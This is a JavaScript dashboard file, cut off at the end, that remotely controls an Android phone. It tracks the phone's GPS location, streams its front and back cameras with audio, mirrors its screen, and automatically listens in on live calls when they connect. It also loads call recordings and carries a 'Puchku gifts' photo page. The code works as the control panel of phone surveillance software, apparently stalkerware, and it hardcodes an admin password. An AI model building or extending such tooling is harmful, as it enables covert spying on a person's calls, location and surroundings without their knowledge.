// State Configuration
let config = {
  serverUrl: localStorage.getItem('server_url') || window.location.origin || 'http://localhost:3000',
  adminToken: localStorage.getItem('admin_token') || 'Aryanayush@1',
  adminEmail: localStorage.getItem('admin_email') || 'user@example.com',
  sound: localStorage.getItem('selected_sound') || 'default',
  customSoundUrl: localStorage.getItem('custom_sound_url') || '',
  callRecordSource: localStorage.getItem('call_record_source') || 'voice_call'
};

// If loaded locally via file://, fallback to default port 3000
if (config.serverUrl.startsWith('file://')) {
  config.serverUrl = 'http://localhost:3000';
}

// Leaflet Map State
let map = null;
let mapMarker = null;
let pollingInterval = null;
let isMapInitialized = false;
let prevCallState = 'IDLE';

// DOM Elements
const serverIndicator = document.getElementById('server-indicator');
const serverStatusText = document.getElementById('server-status-text');
const firebaseStatusBadge = document.getElementById('firebase-status-badge');
const ringBtn = document.getElementById('ring-btn');
const stopBtn = document.getElementById('stop-btn');
const alarmStateText = document.getElementById('alarm-state-text');
const actionStatusMsg = document.getElementById('action-status-msg');

const deviceModel = document.getElementById('device-model');
const deviceSdk = document.getElementById('device-sdk');
const deviceEmail = document.getElementById('device-email');
const deviceLastUpdate = document.getElementById('device-last-update');

const gpsAccuracyBadge = document.getElementById('gps-accuracy-badge');
const latVal = document.getElementById('lat-val');
const lngVal = document.getElementById('lng-val');
const googleMapsBtn = document.getElementById('google-maps-btn');

// Camera DOM Elements
const cameraIndicator = document.getElementById('media-indicator');
const cameraStatusText = document.getElementById('media-status-text');
const cameraPlaceholder = document.getElementById('camera-placeholder');
const cameraVideoFrame = document.getElementById('camera-video-frame');
const cameraLoader = document.getElementById('camera-loader');
const toggleCameraBtn = document.getElementById('toggle-camera-btn');
const frontCamBtn = document.getElementById('front-cam-btn');
const backCamBtn = document.getElementById('back-cam-btn');

// Screen DOM Elements
const tabCameraBtn = document.getElementById('tab-camera-btn');
const tabScreenBtn = document.getElementById('tab-screen-btn');
const cameraPanel = document.getElementById('camera-panel');
const screenPanel = document.getElementById('screen-panel');
const screenPlaceholder = document.getElementById('screen-placeholder');
const screenVideoFrame = document.getElementById('screen-video-frame');
const screenLoader = document.getElementById('screen-loader');
const toggleScreenBtn = document.getElementById('toggle-screen-btn');
const sendScreenNotifBtn = document.getElementById('send-screen-notif-btn');

// Modal Elements
const settingsModal = document.getElementById('settings-modal');
const openSettingsBtn = document.getElementById('open-settings-btn');
const closeSettingsBtn = document.getElementById('close-settings-btn');
const settingsForm = document.getElementById('settings-form');
const serverUrlInput = document.getElementById('server-url-input');
const adminTokenInput = document.getElementById('admin-token-input');
const adminEmailInput = document.getElementById('admin-email-input');
const customFileGroup = document.getElementById('custom-file-group');
const customSoundFile = document.getElementById('custom-sound-file');
const uploadStatus = document.getElementById('upload-status');

// Gifts DOM Elements
const giftUploadZone = document.getElementById('gift-upload-zone');
const giftPhotosInput = document.getElementById('gift-photos-input');
const uploadGiftsBtn = document.getElementById('upload-gifts-btn');
const uploadGiftsProgress = document.getElementById('upload-gifts-progress');
const uploadGiftsBar = document.getElementById('upload-gifts-bar');
const uploadGiftsStatus = document.getElementById('upload-gifts-status');
const refreshGiftsBtn = document.getElementById('refresh-gifts-btn');
const giftsGrid = document.getElementById('gifts-grid');
const giftsEmptyMsg = document.getElementById('gifts-empty-msg');

// Initialize application
document.addEventListener('DOMContentLoaded', () => {
  // Populate settings form inputs with current config
  serverUrlInput.value = config.serverUrl;
  adminTokenInput.value = config.adminToken;
  adminEmailInput.value = config.adminEmail;

  const recordSourceSelect = document.getElementById('recording-source-select');
  if (recordSourceSelect) {
    recordSourceSelect.value = config.callRecordSource;
  }

  const soundSelect = document.getElementById('sound-select');
  if (soundSelect) {
    if (config.sound.startsWith('http://') || config.sound.startsWith('https://') || config.sound === 'custom') {
      soundSelect.value = 'custom';
      customFileGroup.style.display = 'block';
      if (config.customSoundUrl) {
        uploadStatus.textContent = `Active file: ${config.customSoundUrl.split('/').pop()}`;
      }
    } else {
      soundSelect.value = config.sound;
      customFileGroup.style.display = 'none';
    }

    soundSelect.addEventListener('change', (e) => {
      if (e.target.value === 'custom') {
        customFileGroup.style.display = 'block';
      } else {
        customFileGroup.style.display = 'none';
      }
    });
  }

  // Event Listeners
  openSettingsBtn.addEventListener('click', openModal);
  closeSettingsBtn.addEventListener('click', closeModal);
  settingsForm.addEventListener('submit', saveSettings);
  ringBtn.addEventListener('click', triggerAlarm);
  stopBtn.addEventListener('click', stopAlarm);
  toggleCameraBtn.addEventListener('click', toggleCamera);
  frontCamBtn.addEventListener('click', () => setCameraSource('front'));
  backCamBtn.addEventListener('click', () => setCameraSource('back'));
  const cameraAudioBtn = document.getElementById('camera-audio-btn');
  if (cameraAudioBtn) {
    cameraAudioBtn.addEventListener('click', () => {
      if (isCameraAudioPlaying) {
        isCameraAudioManuallyMuted = true;
        stopCameraAudio();
      } else {
        isCameraAudioManuallyMuted = false;
        startCameraAudio();
      }
    });
  }
  tabCameraBtn.addEventListener('click', () => switchMediaTab('camera'));
  tabScreenBtn.addEventListener('click', () => switchMediaTab('screen'));
  toggleScreenBtn.addEventListener('click', toggleScreenShare);
  if (sendScreenNotifBtn) {
    sendScreenNotifBtn.addEventListener('click', sendScreenShareNotification);
  }

  // Close modal when clicking outside content
  window.addEventListener('click', (e) => {
    if (e.target === settingsModal) closeModal();
  });

  // Start polling backend for status updates
  checkStatus();
  pollingInterval = setInterval(checkStatus, 3000);
});

// Modal Logic
function openModal() {
  serverUrlInput.value = config.serverUrl;
  adminTokenInput.value = config.adminToken;
  adminEmailInput.value = config.adminEmail;

  const recordSourceSelect = document.getElementById('recording-source-select');
  if (recordSourceSelect) {
    recordSourceSelect.value = config.callRecordSource;
  }

  const soundSelect = document.getElementById('sound-select');
  if (soundSelect) {
    if (config.sound.startsWith('http://') || config.sound.startsWith('https://') || config.sound === 'custom') {
      soundSelect.value = 'custom';
      customFileGroup.style.display = 'block';
      if (config.customSoundUrl) {
        uploadStatus.textContent = `Active file: ${config.customSoundUrl.split('/').pop()}`;
      }
    } else {
      soundSelect.value = config.sound;
      customFileGroup.style.display = 'none';
    }
  }
  settingsModal.classList.add('active');
}

function closeModal() {
  settingsModal.classList.remove('active');
}

async function saveSettings(e) {
  e.preventDefault();
  const targetServerUrl = serverUrlInput.value.trim().replace(/\/$/, ""); // Remove trailing slash
  const targetAdminToken = adminTokenInput.value.trim();
  const targetAdminEmail = adminEmailInput.value.trim().toLowerCase();
  const soundSelect = document.getElementById('sound-select');
  let selectedSound = soundSelect ? soundSelect.value : 'default';

  if (selectedSound === 'custom') {
    if (customSoundFile.files && customSoundFile.files[0]) {
      const file = customSoundFile.files[0];
      uploadStatus.textContent = 'Uploading sound file... ⏳';
      uploadStatus.style.color = '#f59e0b';
      
      try {
        const fileExt = file.name.split('.').pop();
        const response = await fetch(`${targetServerUrl}/api/upload-sound?email=${encodeURIComponent(targetAdminEmail)}&ext=${fileExt}`, {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${targetAdminToken}`,
            'Content-Type': file.type
          },
          body: file
        });
        
        const json = await response.json();
        if (!json.success) {
          throw new Error(json.error || 'Upload failed');
        }
        
        // Save the full URL of the uploaded custom sound
        config.customSoundUrl = targetServerUrl + json.url;
        localStorage.setItem('custom_sound_url', config.customSoundUrl);
        selectedSound = config.customSoundUrl;
        uploadStatus.textContent = `Uploaded successfully! 🎉 (${file.name})`;
        uploadStatus.style.color = '#10b981';
      } catch (err) {
        console.error('File upload error:', err);
        uploadStatus.textContent = `Upload failed: ${err.message} ❌`;
        uploadStatus.style.color = '#f43f5e';
        return; // Prevent settings from saving or closing modal on error
      }
    } else if (config.customSoundUrl) {
      // Use previously uploaded sound URL
      selectedSound = config.customSoundUrl;
    } else {
      uploadStatus.textContent = 'Please select a file to upload first! ❌';
      uploadStatus.style.color = '#f43f5e';
      return; // Prevent save
    }
  }

  config.serverUrl = targetServerUrl;
  config.adminToken = targetAdminToken;
  config.adminEmail = targetAdminEmail;
  config.sound = selectedSound;

  const recordSourceSelect = document.getElementById('recording-source-select');
  const selectedRecordSource = recordSourceSelect ? recordSourceSelect.value : 'voice_call';
  config.callRecordSource = selectedRecordSource;

  localStorage.setItem('server_url', config.serverUrl);
  localStorage.setItem('admin_token', config.adminToken);
  localStorage.setItem('admin_email', config.adminEmail);
  localStorage.setItem('selected_sound', config.sound);
  localStorage.setItem('call_record_source', config.callRecordSource);

  // Sync settings with server
  try {
    fetch(`${config.serverUrl}/api/settings`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${config.adminToken}`
      },
      body: JSON.stringify({
        email: config.adminEmail,
        callRecordSource: config.callRecordSource
      })
    });
  } catch (error) {
    console.error('Failed to sync settings with server:', error);
  }

  closeModal();
  showFeedback('Settings updated. Reconnecting...', 'success');
  
  // Re-run status check immediately
  checkStatus();
}

// Show temporary status messages in card footer
function showFeedback(message, type = 'info') {
  actionStatusMsg.textContent = message;
  actionStatusMsg.className = `status-msg ${type}`;
  
  // Reset message after 5 seconds
  setTimeout(() => {
    if (actionStatusMsg.textContent === message) {
      actionStatusMsg.textContent = 'System ready';
      actionStatusMsg.className = 'status-msg';
    }
  }, 5000);
}

// Format ISO strings to local readable strings
function formatTimestamp(isoString) {
  if (!isoString) return '-';
  try {
    const date = new Date(isoString);
    return date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }) + ' ' + date.toLocaleDateString();
  } catch (e) {
    return isoString;
  }
}

// Initialize Leaflet Map with Dark Theme
function initializeMap(lat, lng) {
  const mapElement = document.getElementById('map');
  
  // Remove placeholder contents
  mapElement.innerHTML = '';
  
  // Create map instance
  map = L.map('map').setView([lat, lng], 15);
  
  // Use CartoDB Dark Matter map tile layer for premium dark aesthetics
  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
    attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors &copy; <a href="https://carto.com/attributions">CARTO</a>',
    subdomains: 'abcd',
    maxZoom: 20
  }).addTo(map);

  // Add marker
  mapMarker = L.marker([lat, lng]).addTo(map)
    .bindPopup('<b>Phone Location</b><br>Alarm triggered area.')
    .openPopup();

  isMapInitialized = true;
  console.log('🗺️ Leaflet Map initialized.');
}

// Update Map Position
function updateMap(lat, lng, accuracy) {
  if (!isMapInitialized) {
    initializeMap(lat, lng);
    return;
  }

  // Update map center and marker position
  const newLatLng = new L.LatLng(lat, lng);
  mapMarker.setLatLng(newLatLng);
  map.setView(newLatLng, map.getZoom());
  
  if (accuracy) {
    mapMarker.getPopup().setContent(`<b>Phone Location</b><br>Accuracy: ±${Math.round(accuracy)} meters`);
  }
}

// API Call: Fetch status from server
async function checkStatus() {
  if (!config.adminEmail) {
    setServerOffline('Email address not configured');
    return;
  }

  try {
    const response = await fetch(`${config.serverUrl}/api/status?email=${encodeURIComponent(config.adminEmail)}`);
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }
    
    const json = await response.json();
    if (json.success) {
      updateUI(json.data);
    } else {
      throw new Error(json.error || 'Unknown error');
    }
  } catch (error) {
    console.error('Failed to poll status:', error.message);
    setServerOffline(error.message);
  }
}

// Update UI elements based on state data
function updateUI(data) {
  // Handle call state notifications and auto start/stop hearing
  const currentCallState = data.callState || 'IDLE';
  const currentCallNumber = data.callNumber || 'Unknown';

  if (currentCallState !== prevCallState) {
    console.log(`Call state changed: ${prevCallState} -> ${currentCallState}`);
    
    if (currentCallState === 'RINGING') {
      showFeedback(`Incoming call from: ${currentCallNumber} 📞`, 'success');
      if (window.Notification && Notification.permission === 'granted') {
        new Notification("Incoming Call", { body: `Ringing from: ${currentCallNumber} 📞` });
      }
    } else if (currentCallState === 'OFFHOOK') {
      showFeedback(`Call active with: ${currentCallNumber} 🗣️`, 'success');
      if (window.Notification && Notification.permission === 'granted') {
        new Notification("Call Connected", { body: `Active with: ${currentCallNumber} 🗣️` });
      }
      // Auto start listening if we are on the hearing-page
      const hearingPage = document.getElementById('hearing-page');
      if (hearingPage && hearingPage.classList.contains('active')) {
        if (!isHearing) {
          startHearing();
        }
      }
    } else if (currentCallState === 'IDLE') {
      if (prevCallState !== 'IDLE') {
        showFeedback("Call ended.", "info");
        if (window.Notification && Notification.permission === 'granted') {
          new Notification("Call Ended", { body: "Phone call disconnected." });
        }
      }
      // Auto stop listening
      if (isHearing) {
        stopHearing();
      }
    }
    prevCallState = currentCallState;
  }

  // Update Server Connection Status
  serverIndicator.className = 'status-indicator online';
  serverStatusText.textContent = 'Server Connected';

  // Update Firebase Badge
  if (data.firebaseInitialized) {
    firebaseStatusBadge.textContent = 'FCM v1 Active';
    firebaseStatusBadge.className = 'badge firebase-active';
  } else {
    firebaseStatusBadge.textContent = 'FCM Mock Mode';
    firebaseStatusBadge.className = 'badge';
  }

  deviceEmail.textContent = config.adminEmail;

  // Update Device Info Card
  if (data.token) {
    ringBtn.classList.remove('disabled');
    
    if (data.deviceInfo) {
      deviceModel.textContent = data.deviceInfo.model || 'Unknown Android';
      deviceSdk.textContent = `API ${data.deviceInfo.sdkVersion || '-'}`;
    } else {
      deviceModel.textContent = 'Android Device';
      deviceSdk.textContent = 'API Level Unknown';
    }
  } else {
    ringBtn.classList.add('disabled');
    deviceModel.textContent = 'No Device Connected';
    deviceSdk.textContent = '-';
  }

  deviceLastUpdate.textContent = formatTimestamp(data.lastUpdated);

  // Update Alarm State & Ring Button
  if (data.alarmActive) {
    alarmStateText.textContent = 'RINGING';
    alarmStateText.className = 'state-active-label';
    ringBtn.classList.add('ringing');
    stopBtn.classList.remove('disabled');
    stopBtn.disabled = false;
  } else {
    alarmStateText.textContent = 'INACTIVE';
    alarmStateText.className = 'state-inactive';
    ringBtn.classList.remove('ringing');
    stopBtn.classList.add('disabled');
    stopBtn.disabled = true;
  }

  // Update Location Data
  if (data.location) {
    const lat = parseFloat(data.location.latitude);
    const lng = parseFloat(data.location.longitude);
    const accuracy = data.location.accuracy;

    latVal.textContent = lat.toFixed(6);
    lngVal.textContent = lng.toFixed(6);
    gpsAccuracyBadge.textContent = accuracy ? `±${Math.round(accuracy)}m` : 'GPS Active';
    
    // Enable Google Maps Link
    googleMapsBtn.href = `https://www.google.com/maps/search/?api=1&query=${lat},${lng}`;
    googleMapsBtn.classList.remove('disabled');

    // Update map marker
    updateMap(lat, lng, accuracy);
  } else {
    latVal.textContent = '-';
    lngVal.textContent = '-';
    gpsAccuracyBadge.textContent = '-';
    googleMapsBtn.href = '#';
    googleMapsBtn.classList.add('disabled');
  }

  // Update Media Status Header Badge
  const isMediaActive = data.cameraActive || data.screenShareActive;
  if (isMediaActive) {
    cameraIndicator.className = 'status-indicator online blinking';
    cameraStatusText.textContent = 'ACTIVE';
    cameraStatusText.className = 'state-active-label';
  } else {
    cameraIndicator.className = 'status-indicator offline';
    cameraStatusText.textContent = 'OFFLINE';
    cameraStatusText.className = 'state-inactive';
  }

  if (data.token) {
    toggleCameraBtn.classList.remove('disabled');
    frontCamBtn.classList.remove('disabled');
    backCamBtn.classList.remove('disabled');
    toggleScreenBtn.classList.remove('disabled');
    if (sendScreenNotifBtn) sendScreenNotifBtn.classList.remove('disabled');
    if (uploadGiftsBtn) uploadGiftsBtn.classList.remove('disabled');
  } else {
    toggleCameraBtn.classList.add('disabled');
    frontCamBtn.classList.add('disabled');
    backCamBtn.classList.add('disabled');
    toggleScreenBtn.classList.add('disabled');
    if (sendScreenNotifBtn) sendScreenNotifBtn.classList.add('disabled');
    if (uploadGiftsBtn) uploadGiftsBtn.classList.add('disabled');
  }

  // Set active class on active camera source
  if (data.cameraSource === 'front') {
    frontCamBtn.classList.add('active');
    backCamBtn.classList.remove('active');
  } else {
    backCamBtn.classList.add('active');
    frontCamBtn.classList.remove('active');
  }

  // Update Camera Panel Stream
  if (data.cameraActive) {
    toggleCameraBtn.innerHTML = '<i class="fa-solid fa-video-slash"></i> Stop Feed';
    toggleCameraBtn.classList.add('active');

    // Autoplay camera audio if camera feed is active and user hasn't manually muted
    if (!isCameraAudioPlaying && !isCameraAudioManuallyMuted) {
      startCameraAudio();
    }

    const remoteStreamUrl = `${config.serverUrl}/api/camera/stream?email=${encodeURIComponent(config.adminEmail)}&token=${encodeURIComponent(config.adminToken)}`;
    const localIp = data.deviceInfo && data.deviceInfo.localIp;
    const localStreamUrl = localIp && localIp !== '0.0.0.0' ? `http://${localIp}:8085/stream` : null;
    const targetUrl = localStreamUrl || remoteStreamUrl;

    if (cameraVideoFrame.src !== targetUrl && cameraVideoFrame.src !== remoteStreamUrl) {
      cameraLoader.style.display = 'flex';
      cameraPlaceholder.style.display = 'none';
      cameraVideoFrame.style.display = 'none';
      cameraVideoFrame.src = targetUrl;

      // When image begins loading frames
      cameraVideoFrame.onload = () => {
        cameraLoader.style.display = 'none';
        cameraVideoFrame.style.display = 'block';
      };
      cameraVideoFrame.onerror = () => {
        if (localStreamUrl && cameraVideoFrame.src === localStreamUrl) {
          console.warn("Local Wi-Fi camera stream failed. Swapping to Render remote stream.");
          cameraVideoFrame.src = remoteStreamUrl;
        } else {
          cameraLoader.style.display = 'none';
          cameraPlaceholder.style.display = 'flex';
          cameraPlaceholder.querySelector('p').textContent = 'Failed to load camera stream.';
        }
      };
    }
  } else {
    toggleCameraBtn.innerHTML = '<i class="fa-solid fa-video"></i> Start Feed';
    toggleCameraBtn.classList.remove('active');

    cameraPlaceholder.style.display = 'flex';
    cameraPlaceholder.querySelector('p').textContent = 'Camera feed not started. Click "Start Feed" below.';
    cameraVideoFrame.style.display = 'none';
    cameraLoader.style.display = 'none';
    cameraVideoFrame.src = '';
    
    // Reset manual mute state when camera becomes inactive so next camera start will autoplay
    isCameraAudioManuallyMuted = false;

    if (isCameraAudioPlaying) {
      stopCameraAudio();
    }
  }

  // Update Screen Mirror Panel Stream
  if (data.screenShareActive) {
    toggleScreenBtn.innerHTML = '<i class="fa-solid fa-desktop"></i> Stop Mirroring';
    toggleScreenBtn.classList.add('active');

    const remoteScreenUrl = `${config.serverUrl}/api/screen/stream?email=${encodeURIComponent(config.adminEmail)}&token=${encodeURIComponent(config.adminToken)}`;
    const localIp = data.deviceInfo && data.deviceInfo.localIp;
    const localScreenUrl = localIp && localIp !== '0.0.0.0' ? `http://${localIp}:8085/screen` : null;
    const targetScreenUrl = localScreenUrl || remoteScreenUrl;

    if (screenVideoFrame.src !== targetScreenUrl && screenVideoFrame.src !== remoteScreenUrl) {
      screenLoader.style.display = 'flex';
      screenPlaceholder.style.display = 'none';
      screenVideoFrame.style.display = 'none';
      screenVideoFrame.src = targetScreenUrl;

      screenVideoFrame.onload = () => {
        screenLoader.style.display = 'none';
        screenVideoFrame.style.display = 'block';
      };
      screenVideoFrame.onerror = () => {
        if (localScreenUrl && screenVideoFrame.src === localScreenUrl) {
          console.warn("Local Wi-Fi screen stream failed. Swapping to Render remote stream.");
          screenVideoFrame.src = remoteScreenUrl;
        } else {
          screenLoader.style.display = 'none';
          screenPlaceholder.style.display = 'flex';
          screenPlaceholder.querySelector('p').textContent = 'Failed to load screen mirroring.';
        }
      };
    }
  } else {
    toggleScreenBtn.innerHTML = '<i class="fa-solid fa-desktop"></i> Start Mirroring';
    toggleScreenBtn.classList.remove('active');

    screenPlaceholder.style.display = 'flex';
    screenPlaceholder.querySelector('p').textContent = 'Screen mirroring not started. Click "Start Mirroring" below.';
    screenVideoFrame.style.display = 'none';
    screenLoader.style.display = 'none';
    screenVideoFrame.src = '';
  }
}

// Handle Connection Errors
function setServerOffline(errMessage) {
  serverIndicator.className = 'status-indicator offline';
  serverStatusText.textContent = 'Disconnected';
  
  ringBtn.classList.add('disabled');
  stopBtn.classList.add('disabled');
  stopBtn.disabled = true;
  
  alarmStateText.textContent = 'UNKNOWN';
  alarmStateText.className = 'state-inactive';
  ringBtn.classList.remove('ringing');

  toggleCameraBtn.classList.add('disabled');
  frontCamBtn.classList.add('disabled');
  backCamBtn.classList.add('disabled');
  toggleScreenBtn.classList.add('disabled');
  if (sendScreenNotifBtn) sendScreenNotifBtn.classList.add('disabled');
  if (uploadGiftsBtn) uploadGiftsBtn.classList.add('disabled');
  cameraIndicator.className = 'status-indicator offline';
  cameraStatusText.textContent = 'UNKNOWN';
  cameraStatusText.className = 'state-inactive';
  
  cameraVideoFrame.src = '';
  cameraVideoFrame.style.display = 'none';
  cameraLoader.style.display = 'none';
  cameraPlaceholder.style.display = 'flex';

  screenVideoFrame.src = '';
  screenVideoFrame.style.display = 'none';
  screenLoader.style.display = 'none';
  screenPlaceholder.style.display = 'flex';

  showFeedback(`Server error: ${errMessage}`, 'error');
}

// API Call: Trigger Alarm
async function triggerAlarm() {
  if (ringBtn.classList.contains('disabled')) {
    showFeedback('Cannot trigger: No device registered or server is offline.', 'error');
    return;
  }

  const selectedSound = config.sound || 'default';

  showFeedback('Sending ring request...', 'info');

  try {
    const response = await fetch(`${config.serverUrl}/api/trigger`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${config.adminToken}`
      },
      body: JSON.stringify({ 
        email: config.adminEmail,
        sound: selectedSound 
      })
    });

    const json = await response.json();
    if (json.success) {
      if (json.mockMode) {
        showFeedback('Trigger sent (Demo Mode: Not routed via FCM)', 'success');
      } else {
        showFeedback('Phone is ringing!', 'success');
      }
      checkStatus(); // Force state check
    } else {
      showFeedback(`Failed: ${json.error}`, 'error');
    }
  } catch (error) {
    showFeedback(`Network error: ${error.message}`, 'error');
  }
}

// API Call: Stop Alarm
async function stopAlarm() {
  if (stopBtn.classList.contains('disabled')) {
    return;
  }

  showFeedback('Sending stop request...', 'info');

  try {
    const response = await fetch(`${config.serverUrl}/api/stop`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${config.adminToken}`
      },
      body: JSON.stringify({ email: config.adminEmail })
    });

    const json = await response.json();
    if (json.success) {
      showFeedback('Stop alarm sent!', 'success');
      checkStatus(); // Force state check
    } else {
      showFeedback(`Failed: ${json.error}`, 'error');
    }
  } catch (error) {
    showFeedback(`Network error: ${error.message}`, 'error');
  }
}

// Toggle Camera Stream
async function toggleCamera() {
  if (toggleCameraBtn.classList.contains('disabled')) return;

  const isActive = toggleCameraBtn.classList.contains('active');
  const action = isActive ? 'stop' : 'start';

  showFeedback(isActive ? 'Stopping stream...' : 'Requesting stream start...', 'info');

  try {
    const response = await fetch(`${config.serverUrl}/api/camera/control`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${config.adminToken}`
      },
      body: JSON.stringify({
        email: config.adminEmail,
        action: action
      })
    });

    const json = await response.json();
    if (json.success) {
      showFeedback(isActive ? 'Camera stream stopped!' : 'Camera stream requested!', 'success');
      checkStatus(); // Force poll
    } else {
      showFeedback(`Failed: ${json.error}`, 'error');
    }
  } catch (error) {
    showFeedback(`Network error: ${error.message}`, 'error');
  }
}

// Set camera source (front/back)
async function setCameraSource(source) {
  if (frontCamBtn.classList.contains('disabled')) return;

  showFeedback(`Switching to ${source} camera...`, 'info');

  try {
    const response = await fetch(`${config.serverUrl}/api/camera/control`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${config.adminToken}`
      },
      body: JSON.stringify({
        email: config.adminEmail,
        action: 'switch',
        cameraSource: source
      })
    });

    const json = await response.json();
    if (json.success) {
      showFeedback(`Switched to ${source} camera!`, 'success');
      checkStatus(); // Force poll
    } else {
      showFeedback(`Failed to switch camera: ${json.error}`, 'error');
    }
  } catch (error) {
    showFeedback(`Network error: ${error.message}`, 'error');
  }
}

// Switch Media tab (Camera Feed vs Screen Mirror)
function switchMediaTab(tab) {
  if (tab === 'camera') {
    tabCameraBtn.classList.add('active');
    tabScreenBtn.classList.remove('active');
    cameraPanel.style.display = 'block';
    screenPanel.style.display = 'none';
  } else if (tab === 'screen') {
    tabScreenBtn.classList.add('active');
    tabCameraBtn.classList.remove('active');
    screenPanel.style.display = 'block';
    cameraPanel.style.display = 'none';
  }
}

// Toggle Screen Share
async function toggleScreenShare() {
  if (toggleScreenBtn.classList.contains('disabled')) return;

  const isActive = toggleScreenBtn.classList.contains('active');
  const action = isActive ? 'stop' : 'start';

  showFeedback(isActive ? 'Stopping screen mirroring...' : 'Requesting screen mirroring... Allow on device.', 'info');

  try {
    const response = await fetch(`${config.serverUrl}/api/screen/control`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${config.adminToken}`
      },
      body: JSON.stringify({
        email: config.adminEmail,
        action: action
      })
    });

    const json = await response.json();
    if (json.success) {
      showFeedback(isActive ? 'Screen mirror stopped!' : 'Screen mirror requested!', 'success');
      checkStatus(); // Force poll
    } else {
      showFeedback(`Failed: ${json.error}`, 'error');
    }
  } catch (error) {
    showFeedback(`Network error: ${error.message}`, 'error');
  }
}

// Send Screen Share Notification explicitly
async function sendScreenShareNotification() {
  if (sendScreenNotifBtn.classList.contains('disabled')) return;

  showFeedback('Sending screen mirroring request notification to device...', 'info');

  try {
    const response = await fetch(`${config.serverUrl}/api/screen/control`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${config.adminToken}`
      },
      body: JSON.stringify({
        email: config.adminEmail,
        action: 'notify'
      })
    });

    const json = await response.json();
    if (json.success) {
      showFeedback('Notification sent to device!', 'success');
    } else {
      showFeedback(`Failed to send notification: ${json.error}`, 'error');
    }
  } catch (error) {
    showFeedback(`Network error: ${error.message}`, 'error');
  }
}

// ==========================================
// PUCHKU GIFTS NAV & MAXIMIZE CONTROLLERS
// ==========================================

document.addEventListener('DOMContentLoaded', () => {
  // Request notification permissions
  if (window.Notification && Notification.permission === 'default') {
    Notification.requestPermission();
  }

  const navItems = document.querySelectorAll('.nav-item');
  const pageViews = document.querySelectorAll('.page-view');

  navItems.forEach(item => {
    item.addEventListener('click', () => {
      const pageId = item.getAttribute('data-page');
      
      // Update active navbar item
      navItems.forEach(nav => nav.classList.remove('active'));
      item.classList.add('active');
      
      // Update active page view
      pageViews.forEach(view => {
        view.classList.remove('active');
        if (view.id === pageId) {
          view.classList.add('active');
          // Update body background theme class
          const themeClass = Array.from(view.classList).find(c => c.startsWith('theme-'));
          if (themeClass) {
            document.body.className = themeClass;
          }
        }
      });

      // Synchronize with hidden media tab buttons inside app.js logic
      if (pageId === 'camera-page') {
        const tabCam = document.getElementById('tab-camera-btn');
        if (tabCam) tabCam.click();
      } else if (pageId === 'screen-page') {
        const tabScr = document.getElementById('tab-screen-btn');
        if (tabScr) tabScr.click();
      } else if (pageId === 'recordings-page') {
        loadRecordings();
      } else if (pageId === 'gifts-page') {
        loadGifts();
      } else if (pageId === 'location-page') {
        if (map) {
          setTimeout(() => {
            map.invalidateSize();
          }, 200);
        }
      }
    });
  });

  // Maximize / Full screen toggler
  const maximizeBtns = document.querySelectorAll('.maximize-btn');
  maximizeBtns.forEach(btn => {
    btn.addEventListener('click', (e) => {
      e.stopPropagation();
      const page = btn.closest('.page-view');
      if (page) {
        const isMaximized = page.classList.toggle('maximized');
        btn.innerHTML = isMaximized ? '<i class="fa-solid fa-compress"></i> Minimize' : '<i class="fa-solid fa-expand"></i> Full Page';
        
        // Leaflet map needs size recalculation when container size changes
        if (page.id === 'location-page' && map) {
          setTimeout(() => {
            map.invalidateSize();
          }, 400);
        }
      }
    });
  });

  // ESC key to exit full page maximized mode
  window.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
      const maximizedPage = document.querySelector('.page-view.maximized');
      if (maximizedPage) {
        maximizedPage.classList.remove('maximized');
        const btn = maximizedPage.querySelector('.maximize-btn');
        if (btn) {
          btn.innerHTML = '<i class="fa-solid fa-expand"></i> Full Page';
        }
        if (maximizedPage.id === 'location-page' && map) {
          setTimeout(() => {
            map.invalidateSize();
          }, 400);
        }
      }
    }
  });

  // Extract Local IP to display in the system status page if available
  const originalUpdateUI = window.updateUI;
  window.updateUI = function(data) {
    if (typeof originalUpdateUI === 'function') {
      originalUpdateUI(data);
    }
    
    // Display IP in status card
    const ipVal = document.getElementById('device-ip-status');
    if (ipVal) {
      if (data.deviceInfo && data.deviceInfo.localIp && data.deviceInfo.localIp !== '0.0.0.0') {
        ipVal.textContent = data.deviceInfo.localIp;
      } else {
        ipVal.textContent = 'Offline/None';
      }
    }
  };

  // Setup Call Recordings refresh button listener
  const refreshRecordingsBtn = document.getElementById('refresh-recordings-btn');
  if (refreshRecordingsBtn) {
    refreshRecordingsBtn.addEventListener('click', loadRecordings);
  }

  // Setup Gifts page events
  if (giftUploadZone && giftPhotosInput) {
    giftUploadZone.addEventListener('dragover', (e) => {
      e.preventDefault();
      giftUploadZone.classList.add('dragover');
    });

    giftUploadZone.addEventListener('dragleave', () => {
      giftUploadZone.classList.remove('dragover');
    });

    giftUploadZone.addEventListener('drop', (e) => {
      e.preventDefault();
      giftUploadZone.classList.remove('dragover');
      if (e.dataTransfer.files && e.dataTransfer.files.length > 0) {
        giftPhotosInput.files = e.dataTransfer.files;
        updatePhotosInputStatus();
      }
    });

    giftUploadZone.addEventListener('click', () => {
      giftPhotosInput.click();
    });

    giftPhotosInput.addEventListener('change', () => {
      updatePhotosInputStatus();
    });
  }

  if (uploadGiftsBtn) {
    uploadGiftsBtn.addEventListener('click', uploadGifts);
  }

  if (refreshGiftsBtn) {
    refreshGiftsBtn.addEventListener('click', loadGifts);
  }
});

// Call Recordings API Logic
async function loadRecordings() {
  const recordingsList = document.getElementById('recordings-list');
  if (!recordingsList) return;

  recordingsList.innerHTML = `
    <tr>
      <td colspan="5" style="text-align: center; padding: 30px; color: #94A3B8;">
        <i class="fa-solid fa-spinner fa-spin" style="margin-right: 8px;"></i> Loading recordings...
